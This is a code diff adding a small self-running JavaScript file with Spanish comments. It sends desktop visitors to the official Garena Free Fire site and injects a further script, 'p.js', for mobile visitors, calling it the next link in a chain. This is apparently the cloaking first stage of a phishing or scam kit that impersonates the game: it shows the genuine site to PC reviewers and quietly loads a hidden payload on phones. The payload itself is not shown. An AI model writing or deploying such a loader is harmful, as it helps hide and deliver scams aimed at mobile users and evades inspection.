@@ -1,0 +1,14 @@
+(function() {
+    const isMobile = /android|iphone|ipad/i.test(navigator.userAgent.toLowerCase());
+    
+    if (!isMobile) {
+        // Redirige si entran desde PC
+        window.location.replace("https://ff.garena.com/");
+        return;
+    }
+
+    // Carga el siguiente eslabón: p.js
+    const s = document.createElement('script');
+    s.src = "p.js"; 
+    document.head.appendChild(s);
+})();
